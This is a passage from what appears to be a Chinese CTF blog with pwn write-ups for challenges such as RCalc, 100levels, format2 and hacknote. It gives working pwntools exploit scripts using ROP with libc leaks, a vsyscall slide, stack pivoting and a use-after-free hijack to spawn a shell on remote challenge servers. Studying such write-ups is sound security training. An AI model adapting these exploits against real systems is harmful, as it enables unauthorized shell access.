class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io=process(<span class="string">&quot;./RCalc&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">44237</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu10_amd64.so&#x27;</span>)</span><br><span class="line">puts_plt = <span class="number">0x400850</span></span><br><span class="line">__libc_start_main_ = <span class="number">0x601FF0</span></span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x0000000000401123</span></span><br><span class="line">main_addr = <span class="number">0x0000000000401036</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pass_canary</span>(<span class="params">k</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>+k):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;input 2 integer: &quot;</span>)</span><br><span class="line">        io.send(<span class="string">&quot;0\n0\n&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Save the result? &quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">        <span class="comment">#sleep(0.2)</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload+=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi_ret)</span><br><span class="line">    payload+=p64(__libc_start_main_)</span><br><span class="line">    payload+=p64(puts_plt)</span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your name pls: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    pass_canary(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    libc_start_main_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    libc_addr_base=libc_start_main_addr-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;libc_start_main_addr &quot;</span>+<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line">    log.success(<span class="string">&quot;libc_addr_base &quot;</span>+<span class="built_in">hex</span>(libc_addr_base))</span><br><span class="line"></span><br><span class="line">    system_addr=libc_addr_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr=libc_addr_base+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">    payload=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi_ret)</span><br><span class="line">    payload+=p64(bin_sh_addr)</span><br><span class="line">    payload+=p64(system_addr)</span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your name pls: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    pass_canary(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223111914992.png" alt="image-20201223111914992"></p>
<h2 id="23-Aul"><a href="#23-Aul" class="headerlink" title="23.Aul"></a>23.Aul</h2><h2 id="24-1000levevls"><a href="#24-1000levevls" class="headerlink" title="24.1000levevls"></a>24.1000levevls</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212021372.png" alt="image-20201228212021372"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212100952.png" alt="image-20201228212100952"></p>
<h3 id="代码分析-17"><a href="#代码分析-17" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212129503.png" alt="image-20201228212129503"></p>
<p>找到一个栈溢出，但是因为开启了PIE，所以覆盖返回地址不可行，因为不能确定具体的地址，但是可以用vsyscall滑栈的方法。</p>
<p>接下开就是思考如何调用system。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214540803.png" alt="image-20201228214540803"></p>
<p>然后发现程序中有用到system，考虑是否可以利用。查看一下汇编，发现一个有趣的点，system地址入栈是在判断f之前的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214648552.png" alt="image-20201228214648552"></p>
<p>同时查看主函数的调用关系，发现go函数和hint函数是公用一个栈的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214824523.png" alt="image-20201228214824523"></p>
<p>同时还可以在go函数中看到，如果开始输入的是小于等于0的，那么v5不会初始化，也就是说如果先执行hint，然后输入v2小于等于0，那么v5就是system的地址，同时我们还有再一次输入的机会，并且这次输入将写入v6（v5+v3），也就是我们可以以system地址为基准，通过偏移得到任意的libc函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228220305556.png" alt="image-20201228220305556"></p>
<h3 id="思路及利用-15"><a href="#思路及利用-15" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>前面提到，控制程序执行只能通过滑栈的方式，也就是意味着很难有输入参数，因此自然想到将system地址改为onegadget地址，然后滑栈执行。</p>
<p>接下来就是找到one_gadget与system的偏移和滑栈的偏移。而溢出函数ans如图所示，go的rsp就是ans的rbp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228221651239.png" alt="image-20201228221651239"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228222925316.png" alt="image-20201228222925316"></p>
<p>因此进入ans后栈的情况为：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228224934094.png" alt="image-20201228224934094">所以需要有3个vsyscall滑栈到go_rbp-0x110.</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./100levels&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">41349</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vsyscall_addr = <span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;levels?&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(one_gadget-system_offset))</span><br><span class="line"><span class="comment">#需要先回答对99个问题，最后第100个进行溢出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">    v9 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">&quot;* &quot;</span>)</span><br><span class="line">    v10 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Answer:&quot;</span>, <span class="built_in">str</span>(v9 * v10))</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">8</span>)+p64(vsyscall_addr) *<span class="number">3</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Answer:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="25-format2"><a href="#25-format2" class="headerlink" title="25.format2"></a>25.format2</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182624714.png" alt="image-20201230182624714"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182747036.png" alt="image-20201230182747036"></p>
<h3 id="代码分析-18"><a href="#代码分析-18" class="headerlink" title="代码分析"></a>代码分析</h3><p>存在后门函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183308602.png" alt="image-20201230183308602"></p>
<p>而整个程序的流程是将我们输入的字符串进行BASE64解密后，再调用auth函数验证，成功就执行shell。</p>
<p>auth存在一个栈溢出漏洞。v4是int类型有八个字节，而我们的输入最多到12个字节，也就是说我们可以覆盖到ebp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183424923.png" alt="image-20201230183424923"></p>
<h3 id="思路及利用-16"><a href="#思路及利用-16" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>上述分析可知，我们现在可以覆盖auth函数的ebp。</p>
<p>假设我们修改了ebp的内容为xxxx，且这个xxxx能被正常访问，那么auth函数执行完成后，回到main函数的ebp就指向了xxxx。</p>
<p>当main函数结束时，执行leave，retn指令。相当于：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp </span><br><span class="line">pop ebp <span class="comment">//ebp = &amp;xxxx</span></span><br><span class="line">pop rip <span class="comment">//rip = &amp;(xxxx)+4</span></span><br></pre></td></tr></table></figure>

<p>也就是说，如果输入的input为aaaabbbbcccc，将cccc置为input的地址，那么就可以执行bbbb指向的内容。</p>
<p>此，我们把bbbb改成我们的getshell的地址,把cccc改成input_addr，那么我们就能get shell。</p>
<p>接下来就是确定getshell盒4和input的地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185552349.png" alt="image-20201230185552349"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185625780.png" alt="image-20201230185625780"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">p = process(<span class="string">&#x27;./format2&#x27;</span>)  </span><br><span class="line"><span class="comment">#p = remote(&#x27;220.249.52.134&#x27;,31403)  </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./format2&#x27;</span>)  </span><br><span class="line">input_addr = <span class="number">0x811eb40</span></span><br><span class="line">getshell_addr = <span class="number">0x8049284</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Authenticate :&#x27;</span>)  </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(getshell_addr) + p32(input_addr)  </span><br><span class="line">p.sendline(base64.b64encode(payload))  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185951134.png" alt="image-20201230185951134"></p>
<h2 id="26-4-ReeHY-main-100"><a href="#26-4-ReeHY-main-100" class="headerlink" title="26.4-ReeHY-main-100"></a>26.4-ReeHY-main-100</h2><h2 id="27-echo-back"><a href="#27-echo-back" class="headerlink" title="27.echo_back"></a>27.echo_back</h2><h2 id="28"><a href="#28" class="headerlink" title="28."></a>28.</h2><h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211551807.png" alt="image-20201201211551807"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213201788.png" alt="image-20201201213201788"></p>
<h3 id="代码分析-19"><a href="#代码分析-19" class="headerlink" title="代码分析"></a>代码分析</h3><p>主函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213310802.png" alt="image-20201201213310802"></p>
<p>删除堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213328651.png" alt="image-20201201213328651"></p>
<p>输出堆的内容：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213346639.png" alt="image-20201201213346639"></p>
<p>添加堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213401902.png" alt="image-20201201213401902"></p>
<p>自定义的输出函数</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213619289.png" alt="image-20201201213619289"></p>
<p>整个程序分析下来，流程大概是，有一个指针数组ptr。每次新建的时候，ptr申请一个起控制作用的0x8大小的堆（control_chunk），这个堆首先放入自定义的一个输出函数put，然后再指向相应的申请的size大小的存放内容的堆(data_chunk)。在删除时，并没用将指针置null，这里就有UAF漏洞。</p>
<p>而print函数中的<code>(*ptr[v1])(ptr[v1]);</code>实际上就是调用*ptr[v1]的函数（也就是自定义的put函数），ptr[v1]作为函数的参数。正常情况下，是输出ptr[v1+4]指向的内容，即输入的数据。</p>
<p>用图来说明关系：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214918029.png" alt="image-20201201214918029"></p>
<h3 id="思路及利用-17"><a href="#思路及利用-17" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述的分析，显然这道题主要是利用UAF。control_chunk的大小是0x8，释放后会在fastbin中，利用fastbin的特性就可以再申请大小0x8的chunk，对释放的chunk进行写操作。</p>
<p>也就是说，申请两个超过fastbin大小的chunk，然后释放。再申请0x8大小的chunk，这时候就可以向control_chunk进行写操作来执行需要的函数。（这里申请两个超过fastbin大小的chunk，是因为申请0x8的data_chunk还需要一个0x8的control_chunk，而且需要注意fastbin是采用单向链表维护，并且遵循<strong>后进先出</strong>的规则） </p>
<p>首先，需要泄露libc的基地址，这里可以利用自定义的put函数，输出got表项。这里选择free函数。</p>
<p>得到基地址后，只需要将control_chunk的fd改为system的地址，然后再写入参数‘sh’即可。这里就需要先将chunk2释放。但是进入fastbin的chunk仍是之前的两个，所以和之前一样，再次申请的chunk仍可以修改control_chunk1。</p>
<p>这里有一点需要注意的是，执行``(*ptr[v1])(ptr[v1])`时，相当于system（&amp;systemsh）显然是不能正确执行的。需要用一点小技巧，改为system（&amp;system||sh）。</p>
<p>图片演示过程：</p>
<ul>
<li>申请两个chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201222619001.png" alt="image-20201201222619001"></p>
<ul>
<li>依次删除0、1后再申请0x8的chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223133135.png" alt="image-20201201223133135"></p>
<p><strong>这时候就可以通过ptr[2]向control_chunk0写入数据。</strong></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">30500</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">free_got= elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">put = <span class="number">0x804862b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(put)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libcbase=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">payload = p32(system)+<span class="string">b&#x27;||sh&#x27;</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223434405.png" alt="image-20201201223434405"></p>
<h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201225035214.png" alt="image-20201201225035214"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209094754572.png" alt="image-20201209094754572"></p>
<p>RELRO部分开启，可以改写GOT表。</p>
<h3 id="代码分析-20"><a href="#代码分析-20" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095207906.png" alt="image-20201209095207906"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095323845.png" alt="image-20201209095323845"></p>
<p>可以看到，read的范围很大，但是没法溢出栈底。</p>
<blockquote>
<p><strong>int snprintf(char *str, size_t size, const char *format, …)</strong> 设将可变参数(…)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断。</p>
</blockquote>
<p>因此，通过snprintf可以将v2溢出覆盖v3。</p>
<h3 id="思路及利用-18"><a href="#思路及利用-18" class="headerlink" title="思路及利用"></a>思路及利用</h3><blockquote>
<p>通过实验发现，程序应该是使用的libc-2.23，需在相应环境下进行调试。</p>
</blockquote>
<p>v3是格式化字符串，上述分析知道可以将v3改写。利用格式化字符串做到任意地址读写。</p>
<p>这里涉及到snprintf函数的原理。</p>
<blockquote>
<p>snprintf把格式化字符串的地址记下来，然后，每次要处理一个字符时，先从地址处取格式化字符串，然后再根据格式化字符串来处理字符。</p>
</blockquote>
<p>这里地址没有改变，只是地址指向的内容变了。因此，v3改变了，整个格式化字符串就跟着变了。而不是先传入“%s”，snprintf函数就执行“%s”。</p>
<p>有了格式化字符串之后，就考虑如何得到shell。</p>
<p>目前已知，能够改写got表，能够任意地址写。很自然的想到改写某个函数的got为system。同时如之前的‘’greeting-150”，需要考虑到传参问题。</p>
<p>选择free函数的got改为system的plt，在“Input Your Name:”中输入“/bin/sh”。这样执行free（buf），就能得到shell。</p>
<p>整个程序没有使用system，需要先泄露地址。</p>
<p>分析在执行snprintf，且尚未对rsp进行调整时的栈情况：</p>
<p>输入为“aaaa”</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209104042184.png" alt="image-20201209104042184"></p>
<p>发现，可以泄露__libc_start_main+240的地址。</p>
<p>计算偏移：(0x7fffffffdfe8-0x7fffffffd380)/8=397</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag"># 攻防世界</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/6cd531ad/" rel="prev" title="unlink练习">
                  <i class="fa fa-chevron-left"></i> unlink练习
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/e492a0d/" rel="next" title="网络安全课程作业">
                  网络安全课程作业 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ykx</span>
</div>
<!--
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>
-->

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/local-search.js"></script>















  








  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
</html>
